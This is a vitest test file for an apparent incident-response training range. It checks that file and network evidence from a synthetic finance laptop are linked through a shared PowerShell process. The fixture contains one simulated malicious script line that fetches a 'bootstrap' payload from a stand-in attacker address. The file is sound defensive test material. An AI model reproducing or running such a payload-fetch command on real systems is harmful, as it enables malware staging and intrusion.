import {
  describe,
  expect,
  it,
} from "vitest";

import {
  collectAnalystEvidence,
  createAnalystCaseState,
} from "./analystCase";

import {
  buildCaseArtifactLineage,
  buildCaseEvidenceRecords,
} from "./incidentCase";

import {
  createRangeEvidenceEvent,
} from "./rangeEventBridge";

import {
  createSyntheticHostState,
  executeSyntheticHostCommand,
} from "./syntheticHost";

import type {
  SyntheticHostCommandInvocation,
} from "./syntheticHost";

import type {
  SyntheticHostAuthoredRelationship,
} from "./syntheticHostRelationship";

const scriptPath =
  "/Users/smartinez/AppData/Local/Temp/finance-update.ps1";

const host = createSyntheticHostState({
  deviceId: "device-fin-lt-04",
  capabilities: [
    "read:filesystem",
    "read:network",
  ],
  files: [
    {
      path: scriptPath,
      content:
        "Invoke-WebRequest https://203.0.113.77/bootstrap",
      sha256:
        "9e6c9d2f14d2178fd2f7fbf7712c610d53c67c84f2ed8086697245db4f73fa1b",
      owner: "smartinez",
      quarantined: false,
    },
  ],
  processes: [
    {
      pid: 8420,
      image: "powershell.exe",
      commandLine:
        "powershell.exe -File finance-update.ps1",
      accountId: "account-smartinez",
      state: "running",
    },
  ],
  network: {
    listeners: [],
    connections: [
      {
        id: "range-connection-powershell",
        protocol: "tcp",
        localAddress: "10.20.30.44",
        localPort: 49722,
        remoteAddress: "203.0.113.77",
        remotePort: 443,
        state: "established",
        processId: 8420,
      },
    ],
  },
});

const relationships:
  readonly SyntheticHostAuthoredRelationship[] = [
    {
      id: "rel-powershell-script",
      type: "process_file",
      processId: 8420,
      filePath: scriptPath,
      operation: "execute",
    },
  ];

function acquire(
  invocation: SyntheticHostCommandInvocation,
  eventId: string,
) {
  return createRangeEvidenceEvent({
    id: eventId,
    timestamp: new Date(
      Date.parse(invocation.timestamp) + 1,
    ).toISOString(),
    deviceId: host.deviceId,
    invocation,
    execution: executeSyntheticHostCommand(
      host,
      invocation,
    ),
    relationships,
  });
}

describe("Case Range artifact lineage", () => {
  it("connects independently acquired file and network artifacts through shared process lineage", () => {
    const fileEvent = acquire(
      {
        id: "range-command-1",
        timestamp: "2026-08-21T07:00:01.000Z",
        command: {
          type: "read_file",
          path: scriptPath,
        },
      },
      "range-command-1-evidence",
    );
    const networkEvent = acquire(
      {
        id: "range-command-2",
        timestamp: "2026-08-21T07:00:02.000Z",
        command: {
          type: "list_network",
        },
      },
      "range-command-2-evidence",
    );
    const events = [
      fileEvent,
      networkEvent,
    ];
    let state = createAnalystCaseState();

    state = collectAnalystEvidence(
      state,
      fileEvent.id,
      events,
    );
    state = collectAnalystEvidence(
      state,
      networkEvent.id,
      events,
    );

    const evidence = buildCaseEvidenceRecords(
      state,
      events,
    );
    const lineage = buildCaseArtifactLineage(
      evidence,
    );

    expect(evidence[0].artifact?.sourceRefs).toContainEqual({
      kind: "process",
      id: "8420",
    });
    expect(evidence[1].artifact?.sourceRefs).toContainEqual({
      kind: "process",
      id: "8420",
    });
    expect(lineage).toEqual([
      {
        leftArtifactId:
          "range-command-1-artifact",
        rightArtifactId:
          "range-command-2-artifact",
        sharedSourceRefs: [
          {
            kind: "process",
            id: "8420",
          },
        ],
      },
    ]);
  });
});
